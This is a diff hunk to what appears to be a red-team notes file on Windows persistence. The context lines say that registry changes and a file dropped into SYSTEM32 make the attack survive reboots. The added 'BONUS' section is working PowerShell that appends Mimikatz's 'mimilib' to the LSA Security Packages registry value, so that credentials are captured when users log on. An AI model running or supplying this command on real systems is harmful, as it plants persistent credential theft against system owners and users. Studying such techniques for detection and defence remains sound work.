@@ -41,3 +41,8 @@ After completing and confirming changes, when a user next authenticates against 
 
 As these changes are made to the registry and a permanent file is dropping into SYSTEM32 this attack vector will persist after reboots.
 
+BONUS
+
+    $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
+    $packages += "mimilib"
+    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
